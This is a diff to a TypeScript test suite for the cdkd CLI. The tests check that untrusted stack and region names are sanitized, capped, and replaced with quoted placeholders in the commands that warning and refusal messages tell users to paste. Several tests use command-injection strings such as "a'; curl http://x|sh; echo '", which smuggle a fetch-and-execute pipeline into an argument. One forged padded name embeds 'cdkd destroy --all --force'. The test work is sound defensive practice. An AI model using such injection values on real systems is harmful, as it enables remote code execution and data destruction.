@@ -80,6 +80,7 @@ import {
   IDENT_MAX_CODE_POINTS,
   STACK_REF_MAX_CODE_POINTS,
   UNRENDERABLE,
+  displayIdent,
   displaySafe,
   truncateCodePoints,
 } from '../../../src/utils/display-safe.js';
@@ -816,7 +817,11 @@ describe('the orphans CONTAINER (issue go-to-k/cdkd#3379)', () => {
       // sibling's behaviour too.
       const withheld = malformedDestroyOrphansRefusalMessage(`a${String.fromCharCode(0x1b)}b`, 'us-east-1');
       expect(withheld).not.toContain('cdkd state orphan <stack>');
-      expect(withheld).toContain('cdkd state list --long');
+      // `--json`, not `--long`: the listing this arm names must hand back the
+      // spelling the gate refused, and `--long` trims it (go-to-k/cdkd#3420).
+      expect(withheld).toContain("List the records as stored with 'cdkd state list --json'");
+      expect(withheld).toContain('replacing each quoted hole, quotes included, with the shell-quoted value');
+      expect(withheld).not.toContain('--long');
       // No `Drop the record:` LINE either, which is the half a per-string
       // `not.toContain` cannot tell from a template rendered inside the prose.
       expectDestroyCommandLines(withheld, {
@@ -1435,6 +1440,20 @@ describe('the gate-scoped resources texts (issue go-to-k/cdkd#3161)', () => {
     });
   });
 
+  it('the inspect command keeps the REGION at its 128 display cap through the shared gate', () => {
+    // The fold-in onto `pasteableCommand` first widened this to the gate's
+    // 1152 stack-name default, so a 200-code-point region was NAMED in full
+    // under a clause that displays it cut at 128 — the upward borrowing the
+    // rule above forbids. `maxCodePoints` is the fix;
+    // the boundary is pinned on both sides of 128, on a value every other arm
+    // admits (plain letters), so only the cap can decide it.
+    const at = malformedOutputsWarning('MyStack', 'r'.repeat(128));
+    expect(at).toContain(`cdkd state show MyStack --stack-region ${'r'.repeat(128)} --json`);
+    const over = malformedOutputsWarning('MyStack', 'r'.repeat(129));
+    expect(over).toContain("cdkd state show MyStack --stack-region '<region>' --json");
+    expect(over).not.toContain('r'.repeat(129));
+  });
+
   it('the DESTROY refusal puts each command on its own line, per arm', () => {
     // Pinned DIRECTLY rather than through the distance case below: that one
     // asserts what the destructive LINE must not carry, which stays green for a
@@ -1668,9 +1687,34 @@ describe('the gate-scoped resources texts (issue go-to-k/cdkd#3161)', () => {
           'operator can be sent to a healthy same-rendering record'
       ).not.toContain('cdkd state orphan');
       expect(m).toContain('does NOT render exactly');
-      expect(m).toContain('cdkd state list --long');
+      // The raw listing, for the reason the orphans DESTROY text's case gives
+      // (go-to-k/cdkd#3420).
+      expect(m).toContain("List the records as stored with 'cdkd state list --json'");
+      expect(m).toContain('replacing each quoted hole, quotes included, with the shell-quoted value');
+      expect(m).not.toContain('--long');
     });
   }
+
+  it('keeps the EXACT arm on --long, where the name rendered faithfully (control)', () => {
+    // The `--json` pointer is the WITHHOLD arm's; the exact arm only confirms
+    // the key's REGION, which `--long` shows, so it did not move.
+    const m = malformedDestroyResourcesRefusalMessage('prod-api', 'us-east-1');
+    expect(m).toContain("Confirm the key with 'cdkd state list --long'");
+    expect(m).not.toContain('cdkd state list --json');
+  });
+
+  it('pins the premise: displayIdent trims a padded name, JSON.stringify keeps it (go-to-k/cdkd#3420)', () => {
+    // Why the withhold arms point at `--json`: `cdkd state list --long`
+    // renders through `displayIdent`, `--json` through `JSON.stringify`. A
+    // later `displayIdent` that preserved padding shows up HERE as a premise
+    // change rather than passing silently.
+    // The quotes flag the alteration; the SPELLING inside them is the trimmed
+    // one, which is a healthy sibling's name.
+    expect(displayIdent('prod-api ')).toBe('"prod-api"');
+    expect(displayIdent(' prod-api')).toBe('"prod-api"');
+    expect(JSON.stringify('prod-api ')).toBe('"prod-api "');
+    expect(JSON.stringify('prod-api ')).not.toBe(JSON.stringify('prod-api'));
+  });
 
   /**
    * The destroy refusal is THROWN through a caller that classifies
@@ -1928,6 +1972,8 @@ describe('the malformed-outputs warning (issue go-to-k/cdkd#3189)', () => {
     // ...and NOT the resources text's deploy/destroy prohibition: the resource
     // SET is readable here, so borrowing it would attach a
     // re-create-the-world warning to a record whose resources are intact.
+    // Still true after go-to-k/cdkd#3513 added the deploy sentence below: that
+    // one is its own sentence about the `outputs` map, not this prohibition.
     expect(w).not.toContain(`Do NOT run 'cdkd deploy'`);
     // The fabrication clause is CONDITIONAL, not an assertion about this
     // record. Five shapes reach this text and only two of them invent rows —
@@ -1936,6 +1982,37 @@ describe('the malformed-outputs warning (issue go-to-k/cdkd#3189)', () => {
     // three of them (review of go-to-k/cdkd#3194).
     expect(w).toContain('Where the stored value is a string or a list');
     expect(w).toContain('yields no comparison at all');
+  });
+
+  it("names the DEPLOY's refusal of this record, over the OUTPUTS map (go-to-k/cdkd#3513)", () => {
+    // `refuseMalformedOutputs` runs at the deploy engine's state load on the
+    // same predicate this repair takes, and on a NESTED child `cdkd diff` exits
+    // 3 for nothing (go-to-k/cdkd#3335) — so this sentence is the only place
+    // that child's operator learns it. Keyed on the `outputs`-specific phrase so
+    // a reword cannot blunt it into a generic "deploy may fail".
+    const w = malformedOutputsWarning('S', 'us-east-1');
+    expect(w).toContain(
+      "'cdkd deploy' REFUSES this record when it loads it, over this same unreadable 'outputs' map"
+    );
+    // "when it loads it": a deploy skips an unchanged nested-stack row and never
+    // loads that child, so an unconditional "the deploy will fail" overstates.
+    expect(w).not.toMatch(/deploy (will|would) fail/);
+    // Still ends on the read it offers — the new sentence sits BEFORE it.
+    expect(w.endsWith("See the stored value with: cdkd state show S --stack-region us-east-1 --json")).toBe(
+      true
+    );
+  });
+
+  it('stays DISTINCT from the properties warning, each stating its own container consequence', () => {
+    // Two positive "both mention the deploy" assertions would be satisfied by
+    // two identical strings, so pin inequality plus each text's own half.
+    const outputs = malformedOutputsWarning('S', 'us-east-1');
+    const properties = malformedResourcePropertiesWarning('S', 'us-east-1', ['Fn']);
+    expect(outputs).not.toBe(properties);
+    expect(outputs).toContain("over this same unreadable 'outputs' map");
+    expect(properties).not.toContain("'outputs' map");
+    expect(properties).toContain(`Do NOT run 'cdkd deploy' against this record`);
+    expect(outputs).not.toContain(`Do NOT run 'cdkd deploy'`);
   });
 
   it('renders both identifiers exactly as its sibling messages do, and ends on the command', () => {
@@ -2431,7 +2508,7 @@ describe('the entry-level text', () => {
       const text = divergentRecordRegionRefusalMessage(stackName, keyRegion, 'eu-west-1', 1);
       expect(text, label).not.toContain('prod --stack-region us-east-1');
       // The withhold arm still says what to do; it just names no target.
-      expect(text, label).toContain('cdkd state list --long');
+      expect(text, label).toContain('cdkd state list --json');
     }
     // The CONTROL, at this site's OWN cap: it measures a key region at the
     // state-record grammar's 1152 rather than a region's 128 on purpose
@@ -2480,13 +2557,13 @@ describe('the entry-level text', () => {
     }
   });
 
-  it('sanitizes, caps and shell-quotes the STACK and REGION in both texts', () => {
+  it('sanitizes and caps the STACK and REGION in both texts, and holes a non-plain one in the command', () => {
     // The logical-id case above covers one of the three identifiers these texts
     // carry. Stack and region are no more trusted -- a stack name reaches a
     // reader from an S3 KEY and a region from the record BODY -- and unlike the
     // ids they land INSIDE the command the text tells the user to paste, so
-    // they need the shell quoting as well. Removing either one's sanitization
-    // left every other case in this file green.
+    // the command's gate has to refuse them as well. Removing either one's
+    // sanitization left every other case in this file green.
     const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
     const hostileStack = `Evil${FORGERIES.join('')}Stack`;
     const hostileRegion = `us-${FORGERIES.join('')}east-1`;
@@ -2517,24 +2594,31 @@ describe('the entry-level text', () => {
       // QUOTED: `shellQuote` quotes the stand-in because of its angle
       // brackets, which is the point — an empty argument would not be there
       // at all, and `--stack-region` would swallow `--json`.
-      ).toContain(`cdkd state show '${UNRENDERABLE}' --stack-region r --json`);
+      // `'<stack>'` since go-to-k/cdkd#3436's fold-in, where it was
+      // `'${UNRENDERABLE}'`. Both are quoted stand-ins and both close the
+      // empty-argument hazard this case is about; the difference is that the
+      // shared gate's hole says WHICH argument is missing, so an operator can
+      // fill it, while `<unrenderable>` only said that something was. The
+      // sentence beside it carries the reason.
+      ).toContain(`cdkd state show '<stack>' --stack-region r --json`);
       expect(
         build('S', '\u0000', ['R']),
         `${label}: an unrenderable REGION no longer stands in inside the command`
-      ).toContain(`cdkd state show S --stack-region '${UNRENDERABLE}' --json`);
+      ).toContain(`cdkd state show S --stack-region '<region>' --json`);
     }
 
-    // SHELL-QUOTED inside the command: the ASCII allowlist keeps the quote, `;`
-    // and `|`, so an unquoted name would close the quoting and append its own
-    // command to the line the text says to run. Spelled from raw literals
-    // rather than by calling `shellQuote`, so the expected values are
-    // independent of the code under test.
+    // A HOLE inside the command: the ASCII allowlist keeps the quote, `;` and
+    // `|`, so the value renders exactly and exactness alone would have named it
+    // shell-quoted; the shared gate's `plainIdent` refuses it (M2 of the
+    // go-to-k/cdkd#3764 review), since a quoted spelling is what an operator
+    // strips and a padded one can spell a labelled line once the terminal
+    // wraps. Spelled from raw literals rather than by calling `commandHole`,
+    // so the expected values are independent of the code under test.
     // EACH command ARGUMENT of EACH text, independently. One probe on the
     // refusal's stack left three other positions unpinned: the warning's stack,
-    // the warning's region and the refusal's region each quote separately, and
+    // the warning's region and the refusal's region each gate separately, and
     // removing any one of them survived a single combined assertion.
     const HOSTILE_ARG = "a'; curl http://x|sh; echo '";
-    const QUOTED_ARG = String.raw`'a'\''; curl http://x|sh; echo '\'''`;
     for (const [label, build] of [
       ['the refusal', malformedResourceEntriesRefusalMessage],
       ['the warning', malformedResourceEntriesWarning],
@@ -2551,40 +2635,66 @@ describe('the entry-level text', () => {
       };
       expect(
         tail(build(HOSTILE_ARG, 'r', ['R'])),
-        `${label}: the stack argument is no longer shell-quoted, or the command is not last`
-      ).toBe(`cdkd state show ${QUOTED_ARG} --stack-region r --json`);
+        `${label}: the stack argument is no longer a hole, or the command is not last`
+      ).toBe(`cdkd state show '<stack>' --stack-region r --json`);
       expect(
         tail(build('S', HOSTILE_ARG, ['R'])),
-        `${label}: the region argument is no longer shell-quoted, or the command is not last`
-      ).toBe(`cdkd state show S --stack-region ${QUOTED_ARG} --json`);
-      // ...and each is CAPPED in its own text, not only in the one the
-      // distance assertion above measured.
-      // The STACK takes `STACK_REF_MAX_CODE_POINTS` (1152), not an identifier's
-      // 128: a cdkd record's stack name is `parent~child` applied recursively,
-      // so 128 truncated a legitimate nested name and the remedy command then
-      // named a stack that does not exist.
+        `${label}: the region argument is no longer a hole, or the command is not last`
+      ).toBe(`cdkd state show S --stack-region '<region>' --json`);
+      // ...and a PADDED name, exact and admitted by every arm but the
+      // plain-identifier one, is a hole too -- the wrap-forge that arm exists
+      // for -- while `Parent~Child` is named: `~` is a plain-identifier
+      // character.
+      expect(
+        tail(build(`Prod${' '.repeat(60)}Migrate with: cdkd destroy --all --force #`, 'r', ['R'])),
+        `${label}: a padded stack name is named`
+      ).toBe(`cdkd state show '<stack>' --stack-region r --json`);
+      expect(tail(build('Parent~Child', 'r', ['R'])), `${label}: a nested name is holed`).toBe(
+        `cdkd state show 'Parent~Child' --stack-region r --json`
+      );
+      // ...and each is CAPPED in its own DISPLAY, not only in the one the
+      // distance assertion above measured, while the COMMAND holds a quoted
+      // hole for it: since go-to-k/cdkd#3436's fold-in `inspectCommand` builds
+      // through the shared gate, which withholds an over-cap value rather than
+      // naming a cut spelling (the pre-fold form printed the truncated name
+      // into the command, addressing a record that does not exist).
+      // The STACK's display takes `STACK_REF_MAX_CODE_POINTS` (1152), not an
+      // identifier's 128: a cdkd record's stack name is `parent~child` applied
+      // recursively, so 128 truncated a legitimate nested name.
       const longStack = build('q'.repeat(5000), 'r', ['R']);
-      expect(longStack, `${label}: the stack argument is no longer capped`).toContain(
+      expect(longStack, `${label}: the stack DISPLAY is no longer capped`).toContain(
         `${'q'.repeat(1152)}...`
       );
       expect(longStack, `${label}: the stack cap widened past the stack-ref bound`).not.toContain(
         'q'.repeat(1153)
       );
-      // The DIAGNOSIS half carries the wider cap too, not only the remedy
-      // command: they are separate `safeIdentifier` calls, so capping one at an
-      // identifier's 128 while the other keeps 1152 passes an assertion that
-      // looks at the message as a whole.
+      expect(
+        tail(longStack),
+        `${label}: an over-cap stack is named in the command instead of holed`
+      ).toBe("cdkd state show '<stack>' --stack-region r --json");
+      // The DIAGNOSIS half is asserted on its own slice as well, so its cap is
+      // pinned where it renders rather than inferred from the whole message.
       expect(
         longStack.slice(0, longStack.indexOf('cannot be read as resources')),
         `${label}: the DIAGNOSIS still caps the stack name at an identifier's width`
       ).toContain(`${'q'.repeat(1152)}...`);
       expect(longStack.length).toBeLessThan(3000);
       const longRegion = build('S', 'r'.repeat(5000), ['R']);
-      expect(longRegion, `${label}: the region argument is no longer capped`).toContain(
+      expect(longRegion, `${label}: the region DISPLAY is no longer capped`).toContain(
         `${'r'.repeat(128)}...`
       );
+      expect(
+        tail(longRegion),
+        `${label}: an over-cap region is named in the command instead of holed`
+      ).toBe("cdkd state show S --stack-region '<region>' --json");
       expect(longRegion.length).toBeLessThan(1200);
     }
+    // The REGION-LESS arm of `inspectCommand` gates the stack the same way:
+    // a builder handed an empty region names no `--stack-region`, and its
+    // stack argument still goes through `plainIdent` (dropping the option on
+    // that arm alone leaves every other case green).
+    expect(malformedOutputsWarning('S', '')).toMatch(/ with: cdkd state show S --json$/);
+    expect(malformedOutputsWarning(HOSTILE_ARG, '')).toMatch(/ with: cdkd state show '<stack>' --json$/);
   });
 
   it('BOTH texts forward the whole list, named and counted the same way', () => {
@@ -4697,9 +4807,19 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
       expect(text.lastIndexOf('cdkd state show')).toBeGreaterThan(text.indexOf('curl'));
     });
 
-    it(`${build.name} shell-quotes a HOSTILE region`, () => {
+    it(`${build.name} refuses to name a HOSTILE region bare in its command`, () => {
       const text = build('S', "r'; curl http://x|sh; echo '", ['A']);
-      expect(text).toMatch(/--stack-region 'r'\\''/);
+      if (build === malformedOrphanResourcePropertiesRefusalMessage) {
+        // The `cdkd orphan` properties refusal keeps its OWN copy of the gate
+        // (go-to-k/cdkd#3436's remaining half): exact, so named shell-quoted.
+        expect(text).toMatch(/--stack-region 'r'\\''/);
+      } else {
+        // Through the shared gate: renders exactly, so exactness alone would
+        // have named it shell-quoted, and `plainIdent` refuses it (M2 of the
+        // go-to-k/cdkd#3764 review) — a quoted hole instead.
+        expect(text).toMatch(/--stack-region '<region>' --json/);
+        expect(text).not.toMatch(/--stack-region 'r'/);
+      }
       expectNoForgedLines(build, text, build('S', 'us-east-1', ['A']));
     });
 
